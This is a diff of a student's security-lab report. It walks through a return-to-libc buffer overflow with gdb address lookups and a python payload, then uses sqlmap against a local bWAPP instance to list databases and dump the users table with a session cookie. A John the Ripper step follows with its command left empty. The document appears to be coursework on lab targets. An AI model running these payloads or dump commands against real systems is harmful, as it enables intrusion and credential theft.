@@ -131,6 +131,12 @@ Since the hexstring is too large for the buffer, we can't overwrite the return a
 
 By replacing the return address with `system()`'s address, and replace `argc` with the address of `exit()`, I will be able to run the shellcode. And, argv will be the arguments for `system()`.
 
+To get the address of the shellcode, I will save it to a environment variable named VULN_ENV:
+
+```
+export VULN_ENV=/home/hloc/Seclabs/Lab#1
+```
+
 ## 3. Compiling the vulnerable program
 
 ### 3.1. Preparing the environment
@@ -170,7 +176,7 @@ break main
 run
 ```
 
-Then to find the address of `system()` and `exit()`:
+Then to find the address of `system()`, `exit()`, and `sh` (or VULN_ENV):
 
 ```bash
 p system
@@ -178,27 +184,114 @@ p system
 p exit
 ```
 
-![alt text](./img/sys_addr.png)
+and get the address of shellcode:
 
-From the output, the address of `system()` is `0x7ffff7ddad70` and the address of `exit()` is `0x7ffff7dcf5f0`
+```
+p (char*)getenv("VULN_ENV")
+```
+
+![alt text](./img/sys_addr.png)
+![alt text](./img/VULN_ENV.png)
+
+From the output, the address of `system()` is `0xf7dc9170`, the address of `exit()` is `0xf7dbb460`, and the address of VULN_ENV is `0xffffd213`
 
 ### 3.3. Craft the input
 
-First, we have to fill the 16 b ytes of `buffer`, then, we overwrite the address of `eip` and replace it with the address of `system()`
+First, we have to fill the 16 bytes of `buffer` and 4 bytes of `ebp`, then, we overwrite the address of `eip` and replace it with the address of `system()`
 
-**Conclusion**: comment text about the screenshot or simply answered text for the question
+The attack payload:
+
+```
+run $(python -c "print('a'*20 + '\x70\x91\xdc\xf7' + '\x60\xb4\xdb\xf7' + '\x13\xd2\xff\xff')")
+```
 
 # Task 2: Attack on the database of Vulnerable App from SQLi lab
 
 **Question 1**: Use sqlmap to get information about all available databases
 **Answer 1**:
 
-First, we start sqlmap
+First, we install and start sqlmap
 
-Then,
+```
+sudo pip3 install sqlmap
+```
+
+![alt text](/img/install_sqlmap.png)
+![alt text](/img/sqlmap.png)
+
+Then, to check for vulnerability, we check the bWapp to see what will happend if we select data:
+![alt text](/img/b.png)
+
+We can see that when we select a movie, the URL changed:
+![alt text](/img/url.png)
+
+### Get all information about databases:
+
+First, we need to get the cookie for login credential:
+![alt text](/img/cookie.png)
+
+Then, we craft the sqlmap command:
+
+```
+sqlmap "http://localhost:8025/sqli_2.php?movie=1&action=go" --cookie="PHPSESSID=vgkv5rm51fhe6e2qo9qvhc8251; security_level=0" --dbs
+```
+
+-   -u: The target URL.
+-   --cookie: Your DVWA session cookie (replace PHPSESSID=your-session-id with your actual session ID).
+-   --dbs: Tells sqlmap to retrieve the available databases.
+
+![alt text](/img/run1.png)
+
+After a few minutes, the result is
+![alt text](/img/dbs.png)
+
+**Conclusion**: There are 4 available databases: bWAPP, information_schema, mysql, performance_schema
 
 **Question 2**: Use sqlmap to get tables, users information
 **Answer 2**:
 
+To get tables in the database named `bWAPP`, we use
+
+```
+sqlmap "http://localhost:8025/sqli_2.php?movie=1&action=go" --cookie="PHPSESSID=vgkv5rm51fhe6e2qo9qvhc8251; security_level=0" -D bWAPP --tables
+```
+
+-   -D dvwa: Specifies the dvwa database.
+-   --tables: Lists all tables in the specified database.
+
+![alt text](/img/tables.png)
+
+There are 5 tables: blog, heroes, movies, users, visitors
+
+And to get user information, we will exploit the `users` talbes:
+
+```
+sqlmap "http://localhost:8025/sqli_2.php?movie=1&action=go" --cookie="PHPSESSID=vgkv5rm51fhe6e2qo9qvhc8251; security_level=0" -D bWAPP -T users --dump
+```
+
+-   -T users: Specifies the users table.
+-   --dump: Dumps the entire content of the table.
+
+![alt text](/img/users.png)
+
+As we can see, there are 2 users, and their password is hashed (but sqlmap have decode it anyway - "bug")
+
+**Conclusion**: there are 5 tables: blog, heroes, movies, users, visitors; and 2 users in the users table
+
 **Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
 **Answer 3**:
+
+First, install John the Ripper:
+
+```
+sudo apt-get install john
+```
+
+Then we will be able to use john to reveal the password:
+
+```
+
+```
+
+The result is:
+![](/img/pwd.png)
